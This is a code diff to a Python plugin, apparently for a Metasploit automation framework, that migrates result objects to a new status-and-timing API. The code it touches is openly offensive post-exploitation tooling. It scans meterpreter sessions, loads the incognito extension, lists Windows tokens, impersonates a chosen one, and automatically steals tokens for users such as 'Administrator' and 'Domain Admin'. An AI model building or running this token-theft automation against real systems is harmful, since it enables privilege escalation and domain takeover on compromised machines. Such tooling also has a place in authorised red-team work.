@@ -5,10 +5,12 @@ Discovers and manages Windows authentication tokens
 
 import asyncio
 import logging
+import time
 from datetime import datetime
 from typing import Any, Dict, List, Optional, Set
 
-from msf_plugin_system import PluginInterface, PluginMetadata, PluginCategory, PluginContext, OperationResult
+from msf_plugin_system import PluginInterface, PluginMetadata, PluginCategory, PluginContext
+from msf_stable_integration import OperationResult, OperationStatus
 
 logger = logging.getLogger(__name__)
 
@@ -50,6 +52,7 @@ class TokenHunterPlugin(PluginInterface):
         
     async def initialize(self) -> OperationResult:
         """Initialize token hunter plugin"""
+        start_time = time.time()
         try:
             self._initialized = True
             
@@ -57,52 +60,58 @@ class TokenHunterPlugin(PluginInterface):
             self.register_hook("session_opened", self._on_new_session)
             
             return OperationResult(
-                success=True,
-                data={"status": "initialized"},
-                metadata={"plugin": "token_hunter"}
+                OperationStatus.SUCCESS,
+                {"status": "initialized", "plugin": "token_hunter"},
+                time.time() - start_time
             )
             
         except Exception as e:
             logger.error(f"Failed to initialize token hunter: {e}")
             return OperationResult(
-                success=False,
-                data=None,
-                error=str(e)
+                OperationStatus.FAILURE,
+                None,
+                time.time() - start_time,
+                str(e)
             )
             
     async def cleanup(self) -> OperationResult:
         """Cleanup token hunter plugin"""
+        start_time = time.time()
         try:
             self._monitoring = False
             
             return OperationResult(
-                success=True,
-                data={"status": "cleaned_up"},
-                metadata={"plugin": "token_hunter"}
+                OperationStatus.SUCCESS,
+                {"status": "cleaned_up", "plugin": "token_hunter"},
+                time.time() - start_time
             )
             
         except Exception as e:
             logger.error(f"Failed to cleanup token hunter: {e}")
             return OperationResult(
-                success=False,
-                data=None,
-                error=str(e)
+                OperationStatus.FAILURE,
+                None,
+                time.time() - start_time,
+                str(e)
             )
             
     async def cmd_scan(self, session_ids: Optional[List[str]] = None, **kwargs) -> OperationResult:
         """Scan sessions for available tokens"""
+        start_time = time.time()
         try:
             # Get target sessions
             if not session_ids:
                 # Get all meterpreter sessions
                 sessions_result = await self.msf.execute_command("sessions -l")
-                session_ids = self._get_meterpreter_sessions(sessions_result.output)
+                stdout = sessions_result.data.get("stdout", "") if sessions_result.status == OperationStatus.SUCCESS else ""
+                session_ids = self._get_meterpreter_sessions(stdout)
                 
             if not session_ids:
                 return OperationResult(
-                    success=False,
-                    data=None,
-                    error="No meterpreter sessions available"
+                    OperationStatus.FAILURE,
+                    None,
+                    time.time() - start_time,
+                    "No meterpreter sessions available"
                 )
                 
             total_tokens = 0
@@ -114,50 +123,56 @@ class TokenHunterPlugin(PluginInterface):
                     f"sessions -c 'load incognito' -i {session_id}"
                 )
                 
-                if "Success" in load_result.output or "already loaded" in load_result.output:
+                load_stdout = load_result.data.get("stdout", "") if load_result.status == OperationStatus.SUCCESS else ""
+                if "Success" in load_stdout or "already loaded" in load_stdout:
                     # List tokens
                     tokens_result = await self.msf.execute_command(
                         f"sessions -c 'list_tokens -u' -i {session_id}"
                     )
                     
-                    tokens = self._parse_tokens(tokens_result.output)
+                    tokens_stdout = tokens_result.data.get("stdout", "") if tokens_result.status == OperationStatus.SUCCESS else ""
+                    tokens = self._parse_tokens(tokens_stdout)
                     self._discovered_tokens[session_id] = tokens
                     scan_results[session_id] = len(tokens)
                     total_tokens += len(tokens)
                     
             return OperationResult(
-                success=True,
-                data={
+                OperationStatus.SUCCESS,
+                {
                     "sessions_scanned": len(session_ids),
                     "total_tokens": total_tokens,
-                    "results": scan_results
+                    "results": scan_results,
+                    "action": "token_scan"
                 },
-                metadata={"action": "token_scan"}
+                time.time() - start_time
             )
             
         except Exception as e:
             logger.error(f"Token scan error: {e}")
             return OperationResult(
-                success=False,
-                data=None,
-                error=str(e)
+                OperationStatus.FAILURE,
+                None,
+                time.time() - start_time,
+                str(e)
             )
             
     async def cmd_list(self, session_id: Optional[str] = None, **kwargs) -> OperationResult:
         """List discovered tokens"""
+        start_time = time.time()
         try:
             if session_id:
                 # List tokens for specific session
                 tokens = self._discovered_tokens.get(session_id, [])
                 
                 return OperationResult(
-                    success=True,
-                    data={
+                    OperationStatus.SUCCESS,
+                    {
                         "session_id": session_id,
                         "tokens": tokens,
-                        "count": len(tokens)
+                        "count": len(tokens),
+                        "action": "token_list"
                     },
-                    metadata={"action": "token_list"}
+                    time.time() - start_time
                 )
             else:
                 # List all tokens
@@ -170,71 +185,78 @@ class TokenHunterPlugin(PluginInterface):
                         })
                         
                 return OperationResult(
-                    success=True,
-                    data={
+                    OperationStatus.SUCCESS,
+                    {
                         "tokens": all_tokens,
                         "total": len(all_tokens),
-                        "sessions": len(self._discovered_tokens)
+                        "sessions": len(self._discovered_tokens),
+                        "action": "token_list_all"
                     },
-                    metadata={"action": "token_list_all"}
+                    time.time() - start_time
                 )
                 
         except Exception as e:
             logger.error(f"Token list error: {e}")
             return OperationResult(
-                success=False,
-                data=None,
-                error=str(e)
+                OperationStatus.FAILURE,
+                None,
+                time.time() - start_time,
+                str(e)
             )
             
     async def cmd_steal(self, session_id: str, token: str, **kwargs) -> OperationResult:
         """Steal/impersonate a token"""
+        start_time = time.time()
         try:
             # Impersonate token
             cmd = f"sessions -c 'impersonate_token \"{token}\"' -i {session_id}"
             result = await self.msf.execute_command(cmd)
             
-            if "Successfully impersonated" in result.output:
+            stdout = result.data.get("stdout", "") if result.status == OperationStatus.SUCCESS else ""
+            if "Successfully impersonated" in stdout:
                 # Verify current user
                 whoami_result = await self.msf.execute_command(
                     f"sessions -c 'getuid' -i {session_id}"
                 )
                 
+                whoami_stdout = whoami_result.data.get("stdout", "") if whoami_result.status == OperationStatus.SUCCESS else ""
                 self._stolen_tokens[session_id] = {
                     "token": token,
-                    "current_user": self._extract_current_user(whoami_result.output),
+                    "current_user": self._extract_current_user(whoami_stdout),
                     "timestamp": datetime.now().isoformat()
                 }
                 
                 return OperationResult(
-                    success=True,
-                    data={
+                    OperationStatus.SUCCESS,
+                    {
                         "session_id": session_id,
                         "token": token,
                         "impersonated": True,
-                        "current_user": self._stolen_tokens[session_id]["current_user"]
+                        "current_user": self._stolen_tokens[session_id]["current_user"],
+                        "action": "token_steal"
                     },
-                    output=result.output,
-                    metadata={"action": "token_steal"}
+                    time.time() - start_time
                 )
             else:
                 return OperationResult(
-                    success=False,
-                    data=None,
-                    error="Failed to impersonate token",
-                    output=result.output
+                    OperationStatus.FAILURE,
+                    None,
+                    time.time() - start_time,
+                    "Failed to impersonate token"
                 )
                 
         except Exception as e:
             logger.error(f"Token steal error: {e}")
             return OperationResult(
-                success=False,
-                data=None,
-                error=str(e)
+                OperationStatus.FAILURE,
+                None,
+                time.time() - start_time,
+                str(e)
             )
             
     async def cmd_find_user(self, username: str, steal: bool = False, **kwargs) -> OperationResult:
         """Find tokens for specific user"""
+        start_time = time.time()
         try:
             matching_tokens = []
             
@@ -257,34 +279,39 @@ class TokenHunterPlugin(PluginInterface):
                 )
                 
                 return OperationResult(
-                    success=True,
-                    data={
+                    OperationStatus.SUCCESS,
+                    {
                         "found": len(matching_tokens),
                         "matches": matching_tokens,
-                        "stolen": steal_result.success
+                        "stolen": steal_result.status == OperationStatus.SUCCESS,
+                        "action": "find_user",
+                        "auto_steal": True
                     },
-                    metadata={"action": "find_user", "auto_steal": True}
+                    time.time() - start_time
                 )
             else:
                 return OperationResult(
-                    success=True,
-                    data={
+                    OperationStatus.SUCCESS,
+                    {
                         "found": len(matching_tokens),
-                        "matches": matching_tokens
+                        "matches": matching_tokens,
+                        "action": "find_user"
                     },
-                    metadata={"action": "find_user"}
+                    time.time() - start_time
                 )
                 
         except Exception as e:
             logger.error(f"Find user error: {e}")
             return OperationResult(
-                success=False,
-                data=None,
-                error=str(e)
+                OperationStatus.FAILURE,
+                None,
+                time.time() - start_time,
+                str(e)
             )
             
     async def cmd_auto_steal(self, priority_users: Optional[List[str]] = None, **kwargs) -> OperationResult:
         """Automatically steal high-value tokens"""
+        start_time = time.time()
         try:
             high_value_patterns = priority_users or [
                 "Administrator", "admin", "Domain Admin",
@@ -307,7 +334,7 @@ class TokenHunterPlugin(PluginInterface):
                                 token["full_name"]
                             )
                             
-                            if steal_result.success:
+                            if steal_result.status == OperationStatus.SUCCESS:
                                 stolen_count += 1
                                 results.append({
                                     "session_id": session_id,
@@ -318,21 +345,23 @@ class TokenHunterPlugin(PluginInterface):
                             break  # Don't steal same token multiple times
                             
             return OperationResult(
-                success=True,
-                data={
+                OperationStatus.SUCCESS,
+                {
                     "stolen_count": stolen_count,
                     "results": results,
-                    "high_value_patterns": high_value_patterns
+                    "high_value_patterns": high_value_patterns,
+                    "action": "auto_steal"
                 },
-                metadata={"action": "auto_steal"}
+                time.time() - start_time
             )
             
         except Exception as e:
             logger.error(f"Auto steal error: {e}")
             return OperationResult(
-                success=False,
-                data=None,
-                error=str(e)
+                OperationStatus.FAILURE,
+                None,
+                time.time() - start_time,
+                str(e)
             )
             
     async def _on_new_session(self, data: Dict[str, Any]) -> None:
